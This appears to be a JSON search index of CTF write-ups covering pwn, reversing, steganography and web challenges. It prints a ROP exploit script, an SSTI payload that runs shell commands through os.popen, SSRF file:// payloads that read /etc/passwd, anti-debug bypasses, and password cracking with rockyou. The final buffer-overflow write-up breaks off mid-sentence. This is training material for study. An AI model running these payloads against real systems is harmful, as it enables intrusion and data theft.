gadget, and system addr ...\n</code></pre>"},{"location":"cyberedu/pwn/virtual/description/#exploit-script","title":"Exploit Script","text":"<p>Here is the final solution:</p> <pre><code>from pwn import *\n\nfilename = 'exploit.bin'\n\nPOP_RDI     = 0x4012fa      # pop rdi ; ret\nBIN_SH      = 0x40207e      # Address of \"/bin/sh\"\nSYSTEM_PLT  = 0x401184      # Address of system@plt\nRET_GADGET  = 0x40101a      # Your found ret gadget\n\nOFFSET_IDX  = 265\n\nOP_MOV = 0x00\nOP_STR = 0x02\n\nbytecode = b\"\"\n\ndef emit_mov(reg_idx, val_32):\n    global bytecode\n    bytecode += p8(OP_MOV)\n    bytecode += p8(reg_idx)\n    bytecode += p32(val_32)\n\ndef emit_str(mem_idx, reg_idx):\n    global bytecode\n    bytecode += p8(OP_STR)\n    bytecode += p32(mem_idx)\n    bytecode += p8(reg_idx)\n\ndef write_addr_to_stack(start_index, address):\n    low_32  = address &amp; 0xFFFFFFFF\n    high_32 = (address &gt;&gt; 32) &amp; 0xFFFFFFFF\n\n    emit_mov(0, low_32)         # Reg[0] = low_32\n    emit_str(start_index, 0)    # Memory[idx] = Reg[0]\n\n    emit_mov(0, high_32)        # Reg[0] = high_32 (0)\n    emit_str(start_index + 1, 0)# Memory[idx+1] = Reg[0]\n\nidx = OFFSET_IDX\n\nwrite_addr_to_stack(idx, POP_RDI)\nidx += 2\n\nwrite_addr_to_stack(idx, BIN_SH)\nidx += 2\n\nwrite_addr_to_stack(idx, RET_GADGET)\nidx += 2\n\nwrite_addr_to_stack(idx, SYSTEM_PLT)\nidx += 2\n\nwith open(filename, \"wb\") as f:\n    f.write(bytecode)\n\nprint(f\"[+] Fixed bytecode generated: {len(bytecode)} bytes\")\nprint(f\"[+] The 'Invalid opcode 32' error should be gone.\")\nprint(f\"[+] Run: ./virtual {filename} CTF{{test}}\")\n</code></pre>"},{"location":"cyberedu/rev_engineering/mathematics/description/","title":"Challenge: Mathematics","text":"<p>Description: Are you good at math?</p> <p>In this challenge we are provided with a 64-bit binary executable.</p> <p>We run the file and we are prompted with: <code>Enter the pin for the flag here:</code> and it awaits for input.</p> <p>Let's start analyzing the binary to see the logic inside. We will use radare2.</p>"},{"location":"cyberedu/rev_engineering/mathematics/description/#static-analysis-with-radare2","title":"Static Analysis with Radare2","text":"<p>First we will analyze the file entries by prompting <code>aaa</code> and then <code>afl</code> to see the binary functions:</p> <p></p> <p>We will go into the main function and see the logic there with <code>pdf@main</code>.</p> <p>We can see that several computing functions are called:</p> <p></p> <p>And the result is compared with our pin that we input:</p> <p></p>"},{"location":"cyberedu/rev_engineering/mathematics/description/#dynamic-analysis-plan","title":"Dynamic Analysis Plan","text":"<p>As we don't see any anti-debugging protections, we can set a breakpoint after the computing functions, read the value computed and then input it to get the flag.</p> <p>The important instruction is <code>cmp 1_varch, eax</code>. The <code>eax</code> register will contain the value that we input and <code>1_varch</code> will contain the computed value.</p> <p></p> <p>As we see in the image, <code>1_varch</code> is at <code>rbp - 0x1c</code>, so from there we will need to get the value.</p>"},{"location":"cyberedu/rev_engineering/mathematics/description/#dynamic-analysis-with-gdb","title":"Dynamic Analysis with GDB","text":"<p>To do that we will use GDB.</p> <p>We will run <code>gdb ./math.out</code> and set a breakpoint in main with: <code>break main</code>. This is needed so when we disassemble main we will see the runtime addresses of every instruction.</p> <p></p> <p>As we can see, we need to set a breakpoint after: <code>0x0000555555400b53</code> where the computation ends, so the computed value is held in the variable at <code>rbp-0x1c</code>.</p> <p>After we get to that instruction we simply read the value with: <code>x/w $rbp-0x1c</code></p> <p></p> <p>And we get the hex value. We convert that to decimal and get the flag:</p> <p></p>"},{"location":"cyberedu/rev_engineering/mathematics/description/#solution","title":"Solution","text":"<p>The computed value in hex converts to the decimal PIN needed to retrieve the flag.</p>"},{"location":"cyberedu/rev_engineering/strange-puzzle/description/","title":"Description","text":""},{"location":"cyberedu/rev_engineering/strange-puzzle/description/#challenge-name-strange-puzzle","title":"Challenge Name: strange-puzzle","text":""},{"location":"cyberedu/rev_engineering/strange-puzzle/description/#description","title":"Description","text":"<p>We found this strange binary file. It seems to be some kind of puzzle. Can you connect the dots in pairs and uncover the hidden message? We suspect it holds a fragmented key to something valuable to you...</p>"},{"location":"cyberedu/rev_engineering/strange-puzzle/description/#initial-analysis","title":"Initial Analysis","text":"<p>We have a PE executable file. We will do a static analysis in Ghidra and maybe debug with x64dbg, but first, let's run it:</p> <pre><code>./strange-puzzle.exe\nq: empty\ny: y\nc: c\nk: k\nflag1 -&gt; flag2 -&gt; flag3 -&gt; flag4 -&gt; NULL\n</code></pre> <p>We can see some random characters, each pointing to each other and a structure that looks like a simply linked list. Now, we will go into Ghidra and statically analyze the binary so maybe we can identify some functions and rename them.</p>"},{"location":"cyberedu/rev_engineering/strange-puzzle/description/#static-analysis","title":"Static Analysis","text":"<p>During the static analysis, I have found the following interesting functions:</p> <ul> <li>offset 6810 -&gt; <code>main</code> function</li> <li>offset 5010 -&gt; <code>key generator</code></li> <li>offset 43a0 -&gt; <code>Crypto-memset</code></li> <li>offset 50d0 -&gt; <code>decryptor</code></li> <li>offset 4d80 -&gt; <code>init_meta_arr</code></li> <li>offset 8c20 -&gt; <code>~basic_string&lt;&gt;</code></li> <li>offset 5710 -&gt; <code>insert_q</code></li> <li>offset 5bf0 -&gt; <code>insert_y</code></li> <li>offset 6110 -&gt; <code>insert_c</code></li> <li>offset 6510 -&gt; <code>insert_k</code></li> <li>offset 4a90 -&gt; <code>qykc_printer</code></li> <li>offset 4550 -&gt; <code>linked_list_printer</code></li> <li>offset 4f80 -&gt; <code>free</code></li> <li>offset 4750 -&gt; <code>lookup_key</code></li> <li>offset 5530 -&gt; <code>anti-debug-check</code></li> </ul> <p>The renamed <code>main</code> function will look like this:</p> <pre><code>int __cdecl main(int _Argc,char **_Argv,char **_Env) {\n  // ... variable declarations ...\n\n  // Anti-debug and decryption setup\n  local_18 = DAT_14003c180 ^ (ulonglong)auStack_6e8;\n  keyGenerator(local_28,local_38);\n\n  // Initial Decryptor Calls (Setup for the puzzle)\n  decryptor(local_5c0,local_688,local_28,(longlong)local_38);\n  init_meta_arr(local_138,extraout_RAX);\n  // ... (Repeated for other segments) ...\n\n  // The Main Puzzle Logic: Insertions\n  bVar1 = see-anti-debug();\n  local_6a0 = (undefined4)CONCAT71(extraout_var,bVar1);\n\n  // Insert Q\n  local_608 = (_String_val&lt;&gt; *)FUN_140006d90(local_610,local_138);\n  insert_q(local_260,local_608,(longlong)DAT_14003f348);\n  FUN_140004490(DAT_14003f418,local_260);\n\n  // Insert Y\n  local_5f8 = (_String_val&lt;&gt; *)FUN_140006d90(local_600,local_1b8);\n  insert_y(local_280,local_5f8,(longlong)DAT_14003f348);\n  FUN_140004490(DAT_14003f418,local_280);\n\n  // Insert C\n  local_5e8 = (_String_val&lt;&gt; *)FUN_140006d90(local_5f0,local_b8);\n  insert_c(local_2a0,local_5e8,(longlong)DAT_14003f348);\n  FUN_140004490(DAT_14003f418,local_2a0);\n\n  // Insert K\n  local_5d8 = (_String_val&lt;&gt; *)FUN_140006d90(local_5e0,local_238);\n  insert_k(local_2c0,local_5d8,(longlong)DAT_14003f348);\n  FUN_140004490(DAT_14003f418,local_2c0);\n\n  // Printers\n  qykcprinter((longlong)DAT_14003f348);\n  linkedListPrinter(DAT_14003f418);\n\n  // ... Cleanup ...\n  return iVar2;\n}\n</code></pre> <p>The code is too heavy for full static analysis, so we will jump into x64dbg.</p>"},{"location":"cyberedu/rev_engineering/strange-puzzle/description/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>First, we will analyze what the 4 main decryption functions decrypt. Going into the debugger and setting a breakpoint before the decryptor function returns, running it 4 times yields these SHA-256 hashes:</p> <ol> <li><code>3f355c177a1aae6de43e1fd3072f8daf27d18d1fe42a8eea</code></li> <li><code>6423fc41b3444fa8930a35c032397b78aded15cebd481e71</code></li> <li><code>62927f2bbab721edf107f1f5ef3baf08bbbd841d3c9f33c1</code></li> <li><code>0c73cd972119d5be1fec8fa2bd40175a732ec91c0399423d</code></li> </ol> <p>Now, we will analyze the <code>insert</code> functions to see how the insertions are made and why some of them are failing (returning \"empty\"). We can already suppose that in order to get the flag, we need to fill all the letters.</p>"},{"location":"cyberedu/rev_engineering/strange-puzzle/description/#analyzing-insert_q","title":"Analyzing <code>insert_q</code>","text":"<p>Going into <code>insert_q</code>, we see some anti-debug checks:</p> <pre><code>while( true ) {\n   bVar1 = FUN_140006ef0(&amp;local_b0,&amp;local_98);\n   if (!bVar1) break;\n   // ... code checking for processes ...\n   decryptor(local_50,local_148,local_20,(longlong)local_30);\n   // ...\n}\n</code></pre> <p>Here, multiple strings like <code>ghidra.exe</code> and <code>ollydbg.exe</code> are decrypted, so we will jump further with the Hide Debugger option in x64dbg (or patch the jump).</p> <p>The critical part is here:</p> <pre><code>if (cVar2 == '\\0') {\n    // Dependency Check: Looks for 'y' inside insert_q\n    local_128 = lookupKey(param_3,local_110,'y');\n    local_168 = FUN_1400089d0(local_128);\n    ~basic_string&lt;&gt;(local_110);\n\n    if (local_168 == '\\0') {\n        // Failure path -&gt; \"empty\"\n        FUN_140008c50(param_1,local_90); \n        // ... cleanup ...\n    }\n    else {\n        // Success path -&gt; Decrypts flag part!\n        FUN_1400048e0(param_3,0x79);\n        base(param_2,param_1); \n        // ... cleanup ...\n    }\n}\nelse {\n    // Failure path -&gt; \"empty\"\n    FUN_140008c50(param_1,local_90);\n    // ...\n}\n</code></pre> <p>This is the whole logic that we need to bypass. As we can see, in order to insert q, it checks if y is already inserted. Since <code>insert_q</code> runs before <code>insert_y</code>, this is always false.</p> <p>We need to bypass this check. We will set a breakpoint at the ASM instruction:</p> <pre><code>14000592b 74 5b     JZ      LAB_140005988\n</code></pre> <p>Like in this picture: </p> <p></p> <p>Now, watching the assembly, we see that we need to make the jump. In order to do that, we will modify the ZF flag register to 1, step over, and then we will be inside the <code>if</code>.</p> <p>We do the same at the second <code>if</code> (the dependency check) to force execution into the <code>else</code> condition:</p> <pre><code>else {\n    FUN_1400048e0(param_3,0x79); // The filling function\n    base(param_2,param_1);\n    // ...\n}\n</code></pre> <p>The function that makes the filling is at offset <code>48e0</code>. Just execute the function and go next into the <code>insert_y</code> function.</p> <p>For <code>insert_y</code>, <code>insert_k</code>, and <code>insert_c</code>, the logic is the same: we need to reach the <code>48e0</code> offset function (the Updater) to fill the place. To do that, just watch the assembly instructions, breakpoint at jump instructions (<code>JZ</code>/<code>JNZ</code>), and see if you need to jump or step over to force the path to <code>48e0</code>.</p>"},{"location":"cyberedu/rev_engineering/strange-puzzle/description/#the-solution","title":"The Solution","text":"<p>After all 4 functions are executed with our patches, we can simply step over the <code>qykc_print</code> and <code>list_printer</code> functions and watch the console:</p> <p></p> <p>As we see in the picture, the output completely changed. The 4 letters now display a Hex Key and the flags are some Base64 encoded strings.</p> <p>We go to CyberChef and make the following setup:</p> <ol> <li>From Base64</li> <li>XOR (with the Key displayed by the 4 letters: <code>97 63 38 C6</code>)</li> </ol> <p>As we can see in the picture, part of the flag is being decrypted. We will do that for all the Base64 strings displayed, concatenate the parts, and we will have the final flag.</p> <p></p>"},{"location":"cyberedu/steganography/coffee-time/description/","title":"Coffee Time","text":"<p>Challenge Name: Coffee time Description: Someone's been sending some suspicious data underneath our noses. Your task is to get to the bottom of this. Also, ignore the title... though, you might need a cup or two.</p>"},{"location":"cyberedu/steganography/coffee-time/description/#writeup","title":"Writeup","text":"<p>Today we have a steganography challenge. First, we have a zip file. We try extracting it and see that it is password protected.</p> <p></p> <p>In order to find the password, I used <code>fcrackzip</code>: <pre><code>fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u flag.zip\n</code></pre></p> <p>After we found the password, we can see that we have a <code>flag.png</code> file. Let's look at it.</p> <p></p> <p>No clues here, so let's try some tools to see what we can find.</p> <p>After using StegOnline, we found a zip file at bit 3 LSB:</p> <p></p> <p>Also, we found something interesting while running <code>zsteg</code>:</p> <p></p> <p>It is in binary form. After numerous research, I found the key: 3317, by applying the following ciphers: from binary \u2192 from base85 \u2192 ROT13 \u2192 from hex \u2192 from base64.</p> <p></p> <p>We will note this.</p> <p>Now let's look into the zip file that we got. Here we have 2 pictures: - <code>crafting.png</code>: </p> <ul> <li><code>key.png</code>: </li> </ul> <p>There may be some hints in the photos. For example, in the crafting photo we will try to extract bits 0,1,2 from channels R,G.</p> <p>We couldn't find anything by extracting that from <code>crafting.png</code>, nor by extracting 0,1,2 from color B from <code>key.png</code>, so we will try doing that on <code>flag.png</code>, the first image.</p> <p>And we have found another zip file:</p> <p></p> <p>And from the clue in <code>key.png</code>, we found some binary data:</p> <p></p> <p>This may also be an RC4 key.</p> <p>Applying the same cipher order as we did for the first key, we get:</p> <p>Key: <code>33179FE2474DF368B9D29E3355FE27EF4CA07CD063582E01C75822C54D2CD6EC1DEE5C01885E6CE3C775436749349AEEA4E93F97F2606DEF7EEA7CC0F4E60F40</code></p> <p>We see indeed that this is the real key and the <code>zsteg</code> tool was not giving us the full key. We know that this is an RC4 key. Let's analyze the last zip that we got.</p> <p>Here we only see a file named <code>2</code>:</p> <p></p> <p>Opening it with Notepad++, we see some base64 encoded text:</p> <p></p> <p>We will get that and put it into CyberChef.</p> <p>The base64 didn't get us anywhere, so we also added RC4-Drop on top of that as we have an RC4 key.</p> <p>After going through the rabbit hole, we found the cipher list: from base64 \u2192 RC4-Drop \u2192 ROT47 \u2192 from base32 \u2192 from hex \u2192 from base85 \u2192 from base64. We found a zip file:</p> <p></p> <p>Here we got another PNG file and the zip is password protected. The zip password is the RC4 key found earlier.</p> <p>This is the picture that we got:</p> <p></p> <p>We see that we have a strange chunk of pixels, so we will cut them separately from the picture and then try to extract some data from there.</p> <p>We carefully cut the chunk in Paint and copy it into another window. After that, we save the PNG file.</p> <p>After various attempts in row 7 on channel RGB, LSB encoding, we find a zip:</p> <p></p> <p>We download the zip and have the flag in plaintext in the notepad inside.</p>"},{"location":"cyberedu/steganography/flag-is-hidden/description/","title":"flag-is-hidden","text":"<p>Challenge Name: flag-is-hidden Description: The flag is hidden in the attached file. Can you find it? PS: stegano tools can \"rock your\" score</p>"},{"location":"cyberedu/steganography/flag-is-hidden/description/#writeup","title":"Writeup","text":"<p>We have a new steganography challenge. First, we are provided with an <code>.apk</code> file which we will extract to a directory:</p> <p></p> <p>Going through the extracted folder, we try looking for photos by doing: <pre><code>find . -name \"*.png\"\n</code></pre></p> <p>We see many photos. While trying to look for other photos, we see that there is one JPG: <pre><code>find . -name \"*.jpg\"\n</code></pre></p> <p></p> <p>From the hint, we will try to brute force it with <code>rockyou.txt</code> and see what we can extract: <pre><code>stegseek ./res/drawable-v24/splash.jpg /usr/share/wordlists/rockyou.txt\n</code></pre></p> <p>We immediately find the password, see what the extracted file contains, base64 decode it, and get the flag:</p> <p></p>"},{"location":"cyberedu/web/http-for-pros/description/","title":"Description","text":"<p>Challenge name: http-for-pros Description: You have all the hints you need... Get the flag!</p> <p>We opened burpsuite and tried different payloads in order to get the flag. The vulnerability is a SSTI and the server is running on python. Many chars are blacklisted like '.'. After a close analysis and a look on payloadsallthethings I found the exploit: curl -G \"http://35.246.235.150:30463\" \\</p> <p>--data-urlencode 'content={{request[\"appli\"+\"cation\"][request.args.u2+\"globals\"+request.args.u2][request.args.u2+\"buil\"+\"tins\"+request.args.u2]request.args.u2+\"imp\"+\"ort\"+request.args.u2\"po\"+\"pen\"\"read\"}}' \\   --data-urlencode 'u=_' \\   --data-urlencode 'f=cat flag'</p>"},{"location":"cyberedu/web/reccon/description/","title":"Description","text":""},{"location":"cyberedu/web/reccon/description/#challenge-reccon","title":"Challenge: Reccon","text":"<p>Type: Web Description: I heard you like memes, so we had a surprise for you. Enjoy !!</p>"},{"location":"cyberedu/web/reccon/description/#initial-analysis","title":"Initial Analysis","text":"<p>When we enter the site we only see a blank page with a meme: </p> <p>No other endpoints, no clues in the responses and headers.</p>"},{"location":"cyberedu/web/reccon/description/#enumeration-process","title":"Enumeration Process","text":"<p>After trying to enumerate the website, bust directories and other techniques we tried to search for params. To do that we used the burp-params.txt wordlist and the ffuf tool.</p>"},{"location":"cyberedu/web/reccon/description/#parameter-fuzzing-first-attempt","title":"Parameter Fuzzing - First Attempt","text":"<p>When we first run: <pre><code>ffuf -u \"http://35.246.235.150:32555/?FUZZ=test\" -w burp-parameter-names.txt -mc 200,301,302,401,403\n</code></pre> </p> <p>We see that we got false positives for every param, each having size 76, so we will filter out by that size to only show params with size different of 76.</p>"},{"location":"cyberedu/web/reccon/description/#parameter-fuzzing-filtered-results","title":"Parameter Fuzzing - Filtered Results","text":"<p><pre><code>ffuf -u \"http://35.246.235.150:32555/?FUZZ=test\" -w burp-parameter-names.txt -mc 200,301,302,401,403 -fs 76\n</code></pre> </p> <p>As we see we got some params with the same size, but the parameter \"m\" has a different size so we will use it to see what the request returns.</p>"},{"location":"cyberedu/web/reccon/description/#flag-discovery","title":"Flag Discovery","text":"<pre><code>curl \"http://35.246.235.150:32555/?m=test\"\n</code></pre> <p>Running the command will give us the flag: </p>"},{"location":"cyberedu/web/reccon/description/#key-learning-points","title":"Key Learning Points:","text":"<ol> <li>Parameter Discovery: Hidden GET parameters can reveal functionality</li> <li>Response Size Filtering: Using <code>-fs</code> to filter false positives in ffuf</li> <li>Wordlist Selection: Using appropriate wordlists like burp-parameter-names.txt</li> <li>Thorough Enumeration: When directories fail, try parameter fuzzing</li> </ol>"},{"location":"cyberedu/web/reccon/description/#tools-used","title":"Tools Used:","text":"<ul> <li>ffuf: Fast web fuzzer for parameter discovery</li> <li>burp-parameter-names.txt: Common parameter wordlist</li> <li>curl: Testing discovered parameters</li> </ul> <p>This challenge demonstrates the importance of comprehensive web enumeration beyond just directory busting!</p>"},{"location":"cyberedu/web/ultra-crawl/description/","title":"Challenge: ultra-crawl","text":""},{"location":"cyberedu/web/ultra-crawl/description/#description","title":"Description","text":"<p>Here is your favorite proxy for crawling minimal websites.</p>"},{"location":"cyberedu/web/ultra-crawl/description/#initial-reconnaissance","title":"Initial Reconnaissance","text":"<p>First step we open the website and see simple interface where you input a link and it will crawl it.</p> <p></p> <p>From the beginning I can say that this will be an SSRF challenge so I will go right into Burp Suite.</p>"},{"location":"cyberedu/web/ultra-crawl/description/#setting-up","title":"Setting Up","text":"<p>We are going to set up the proxy, catch the POST request and then send to Repeater so we can play with it.</p>"},{"location":"cyberedu/web/ultra-crawl/description/#exploitation","title":"Exploitation","text":"<p>After trying many SSRF techniques like trying to access localhost or other things I got something positive:</p> <p></p> <p>Sending <code>file:////etc/passwd</code> as the payload exposes the passwd file, where we can see the ctf user.</p>"},{"location":"cyberedu/web/ultra-crawl/description/#file-system-enumeration","title":"File System Enumeration","text":"<p>We are going to leak the ctf directory for files.</p> <p>We leaked the app.py code:</p> <p></p> <p>by using the payload: <code>file:////home/ctf//app.py</code></p>"},{"location":"cyberedu/web/ultra-crawl/description/#source-code-analysis","title":"Source Code Analysis","text":"<p>The code is:</p> <pre><code>HTTP/1.0 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 774\nServer: Werkzeug/2.0.1 Python/3.6.9\nDate: Fri, 10 Oct 2025 14:40:52 GMT\n\nimport base64\nfrom urllib.request import urlopen\nfrom flask import Flask, render_template, request\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    print(request.headers['Host'])\n    if request.headers['Host'] == \"company.tld\":\n        flag = open('sir-a-random-folder-for-the-flag/flag.txt').read()\n        return flag\n\n    if request.method == 'POST':\n        url = request.form.get('url')\n        output = urlopen(url).read().decode('utf-8')\n        if base64.b64decode(\"Y3Rmew==\").decode('utf-8') in output:\n            return \"nope! try harder!\"\n        return output\n    else:\n        return render_template(\"index.html\")\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True, use_evalex=False)\n</code></pre>"},{"location":"cyberedu/web/ultra-crawl/description/#finding-the-vulnerability","title":"Finding the Vulnerability","text":"<p>The important line of the code is this:</p> <pre><code>if request.headers['Host'] == \"company.tld\":\n    flag = open('sir-a-random-folder-for-the-flag/flag.txt').read()\n    return flag\n</code></pre> <p>So if we send a request with that specific header as host it will give us the flag.</p>"},{"location":"cyberedu/web/ultra-crawl/description/#solution","title":"Solution","text":"<p>The crafted payload that gives us the flag is:</p> <pre><code>curl -H \"Host: company.tld\" &lt;IP:PORT&gt;\n</code></pre>"},{"location":"ismctf2025/crackmeifyoucan/description/","title":"Crack Me If You Can - CTF Writeup","text":""},{"location":"ismctf2025/crackmeifyoucan/description/#challenge-overview","title":"Challenge Overview","text":"<p>We are provided with a heavily obfuscated authentication system. The binary performs several transformations on our input and compares it against a hardcoded hash value.</p>"},{"location":"ismctf2025/crackmeifyoucan/description/#initial-analysis","title":"Initial Analysis","text":"<p>Starting from the comparison point, we can see an if/else statement indicating success or failure:</p> <p></p> <p>Our strategy is to work backwards from this comparison to understand the transformations applied to our input.</p>"},{"location":"ismctf2025/crackmeifyoucan/description/#debugging-and-discovery","title":"Debugging and Discovery","text":"<p>By debugging the binary, we let the obfuscated strings decrypt themselves. We can observe the comparison between our transformed input and the expected hash.</p> <p></p>"},{"location":"ismctf2025/crackmeifyoucan/description/#register-values","title":"Register Values","text":"<p>From the debugger, we extract two crucial values:</p> <ul> <li>r13 (expected hash): <code>03570087f6d12a5c8f42c8c30614a5ca9dcfa63f66d913a6c5b472e7430ad739cd96765909875629edd369b5ec2b7faf5718cd08bb531b9d14d0bcbdd7022ed4</code></li> <li>r14 (our transformed input): <code>0a5c55d2f9d5295adc11cf970111f5ca99c1a53236d811fac5e676b2140fd8389bcf230002d5557abbd339e1bc2d26ff044ac75ebb5c1f981683beeb830f29d5</code></li> </ul> <p>The value in r13 is our target - this is what our input needs to produce after transformation.</p>"},{"location":"ismctf2025/crackmeifyoucan/description/#reverse-engineering-the-transformations","title":"Reverse Engineering the Transformations","text":""},{"location":"ismctf2025/crackmeifyoucan/description/#discovery-1-rc4-encryption","title":"Discovery 1: RC4 Encryption","text":"<p>Tracing back through the code, we find a function that implements the RC4 encryption algorithm:</p> <p></p> <p>To reverse RC4, we need to find the encryption key. Setting a breakpoint at the function call reveals:</p> <p></p> <p>RC4 Key found: <code>gr00t_gr00t_keep_l00king</code></p>"},{"location":"ismctf2025/crackmeifyoucan/description/#discovery-2-sha-256-hashing","title":"Discovery 2: SHA-256 Hashing","text":"<p>Continuing to trace backwards, we find another function call:</p> <p></p> <p></p> <p>Debugging into this function reveals characteristic SHA-256 initialization constants: - <code>0x6a09e667</code> - <code>0xbb67ae85</code> - <code>0x3c6ef372</code> - <code>0xa54ff53a</code></p> <p>This confirms that SHA-256 hashing is applied to the input.</p>"},{"location":"ismctf2025/crackmeifyoucan/description/#discovery-3-hex-encoding","title":"Discovery 3: Hex Encoding","text":"<p>The final transformation is hex encoding of the result.</p>"},{"location":"ismctf2025/crackmeifyoucan/description/#transformation-chain","title":"Transformation Chain","text":"<p>The complete transformation pipeline is:</p> <pre><code>Input \u2192 SHA-256 \u2192 RC4 Encryption \u2192 Hex Encode \u2192 Compare\n</code></pre>"},{"location":"ismctf2025/crackmeifyoucan/description/#exploitation-strategy","title":"Exploitation Strategy","text":"<p>To recover the original password, we reverse these transformations:</p> <ol> <li>Hex decode the target hash from r13</li> <li>Decrypt with RC4 using the discovered key</li> <li>Crack the SHA-256 hash to get the original password</li> </ol>"},{"location":"ismctf2025/crackmeifyoucan/description/#solution-script","title":"Solution Script","text":"<p>Here's the script to reverse the RC4 encryption and obtain the SHA-256 hash:</p> <pre><code>import hashlib\nimport base64\n\n# RC4 implementation\ndef rc4_crypt(data, key):\n    \"\"\"Standard RC4 implementation\"\"\"\n    S = list(range(256))\n    j = 0\n\n    # KSA (Key Scheduling Algorithm)\n    for i in range(256):\n        j = (j + S[i] + key[i % len(key)]) % 256\n        S[i], S[j] = S[j], S[i]\n\n    # PRGA (Pseudo-Random Generation Algorithm)\n    i = j = 0\n    result = []\n    for byte in data:\n        i = (i + 1) % 256\n        j = (j + S[i]) % 256\n        S[i], S[j] = S[j], S[i]\n        K = S[(S[i] + S[j]) % 256]\n        result.append(byte ^ K)\n\n    return bytes(result)\n\n# Found RC4 key\nrc4_key = b\"gr00t_gr00t_keep_l00k1ng\"\n\nprint(f\"RC4 Key (hex): {rc4_key.hex()}\")\n\n# Target ciphertext from r13\nexpected_hex = \"03570087f6d12a5c8f42c8c30614a5ca9dcfa63f66d913a6c5b472e7430ad739cd96765909875629edd369b5ec2b7faf5718cd08bb531b9d14d0bcbdd7022ed4\"\nciphertext = bytes.fromhex(expected_hex)\n\n# Decrypt RC4 to get the SHA-256 hash\nsha256_hash = rc4_crypt(ciphertext, rc4_key)\n\nprint(f\"\\n=== TARGET SHA-256 HASH ===\")\nprint(f\"SHA-256: {sha256_hash.hex()}\")\nprint(f\"Length: {len(sha256_hash)} bytes\")\n</code></pre>"},{"location":"ismctf2025/crackmeifyoucan/description/#script-output","title":"Script Output","text":"<p>Running this script produces:</p> <p></p> <p>The output is hex-encoded. Using CyberChef to apply \"From Hex\" transformation:</p> <p></p> <p>SHA-256 hash obtained: <code>03fa735b05ed2f2129b8336e5aa7607bb86a20222fec64a6a43206ec3c5315a1</code></p>"},{"location":"ismctf2025/crackmeifyoucan/description/#cracking-the-sha-256-hash","title":"Cracking the SHA-256 Hash","text":"<p>We use hashcat with the rockyou.txt wordlist to crack the SHA-256 hash:</p> <pre><code>hashcat -m 1400 03fa735b05ed2f2129b8336e5aa7607bb86a20222fec64a6a43206ec3c5315a1 /usr/share/SecLists-master/Passwords/Leaked-Databases/rockyou.txt\n</code></pre> <p></p> <p>Password recovered: <code>downwithhackerz</code></p>"},{"location":"ismctf2025/crackmeifyoucan/description/#getting-the-flag","title":"Getting the Flag","text":"<p>The final step is to compute the MD5 hash of the password:</p> <pre><code>echo -n \"downwithhackerz\" | md5sum\n</code></pre> <p>Flag: <code>ISMCTF{66e8a9183004e1493c66db98b63e9965}</code></p>"},{"location":"ismctf2025/crackmeifyoucan/description/#summary","title":"Summary","text":"<p>This challenge required reverse engineering a multi-layer authentication system:</p> <ol> <li>Identified the comparison point and target hash</li> <li>Discovered RC4 encryption with key <code>gr00t_gr00t_keep_l00king</code></li> <li>Identified SHA-256 hashing via characteristic constants</li> <li>Reversed the transformation chain: Hex decode \u2192 RC4 decrypt \u2192 SHA-256 crack</li> <li>Used hashcat to recover the password <code>downwithhackerz</code></li> <li>Computed MD5 of the password to get the flag</li> </ol> <p>Tools Used: - GDB/Debugger for dynamic analysis - Python for RC4 decryption - CyberChef for hex conversion - Hashcat for SHA-256 cracking - rockyou.txt wordlist</p>"},{"location":"pwnable.kr/","title":"pwnable.kr Challenges","text":"<p>This directory contains writeups for pwnable.kr challenges organized by difficulty level.</p>"},{"location":"pwnable.kr/#beginner-level","title":"Beginner Level","text":"Challenge Description Buffer Overflow Stack-based buffer overflow Collision Hash collision challenge Flag Basic reverse engineering Passcode Format string vulnerability"},{"location":"pwnable.kr/#intermediate-level","title":"Intermediate Level","text":"Challenge Description Random Predictable randomness exploitation Input Multi-vector input validation Leg ARM assembly analysis"},{"location":"pwnable.kr/#advanced-level","title":"Advanced Level","text":"Challenge Description HorCruxes Return-oriented programming Lotto Probability manipulation <p>Total Challenges: 9 Difficulty Levels: Beginner, Intermediate, Advanced</p> <p>Back to Main Repository</p>"},{"location":"pwnable.kr/pwnable-bufferOverflow/description/","title":"Challenge 3: Buffer Overflow","text":""},{"location":"pwnable.kr/pwnable-bufferOverflow/description/#challenge-code","title":"Challenge Code","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid func(int key) {\n    char overflowme[32];\n    printf(\"overflow me : \");\n    gets(overflowme);  // Vulnerable function\n    if (key == 0xcafebabe) {\n        system(\"/bin/sh\");\n    } else {\n        printf(\"Nah..\\n\");\n    }\n}\n\nint main(int argc, char* argv[]) {\n    func(0xdeadbeef);\n    return 0;\n}\n</code></pre>"},{"location":"pwnable.kr/pwnable-bufferOverflow/description/#challenge-objective","title":"Challenge Objective","text":"<p>In this challenge, we will: - Understand what a buffer overflow is. - Exploit the <code>gets()</code> vulnerability to overwrite the <code>key</code> variable with the value <code>0xcafebabe</code>. - When the condition <code>key == 0xcafebabe</code> is true, the program executes <code>system(\"/bin/sh\")</code>, providing a shell to capture the flag.</p>"},{"location":"pwnable.kr/pwnable-bufferOverflow/description/#understanding-buffer-overflow","title":"Understanding Buffer Overflow","text":"<p>A buffer overflow occurs when we input more data than a variable can hold, causing it to overwrite adjacent memory zones. Every variable in a program is assigned a specific memory zone, but if we can write beyond the boundaries of that memory, we can overwrite other variables, stack pointers, or return addresses.</p> <p>In this case: 1. The <code>gets()</code> function does not perform bounds checking and allows input longer than <code>overflowme</code>\u2019s allocated size of 32 bytes. 2. This overflow can overwrite the <code>key</code> variable, which is stored nearby in memory.</p>"},{"location":"pwnable.kr/pwnable-bufferOverflow/description/#plan-to-exploit","title":"Plan to Exploit","text":"<p>Our goal is to: 1. Overflow the buffer (<code>overflowme</code>) and write enough data to overwrite the memory where the <code>key</code> variable is stored. 2. Set <code>key = 0xcafebabe</code> by carefully crafting our payload.</p>"},{"location":"pwnable.kr/pwnable-bufferOverflow/description/#analyzing-the-code","title":"Analyzing the Code","text":""},{"location":"pwnable.kr/pwnable-bufferOverflow/description/#vulnerable-function-func","title":"Vulnerable Function: <code>func()</code>","text":"<ol> <li>Overflow Variable:</li> <li> <p><code>overflowme</code> is a 32-byte buffer located at <code>ebp - 0x2c</code> (32 bytes below the base pointer).</p> </li> <li> <p>Key Variable:</p> </li> <li> <p>The <code>key</code> variable is 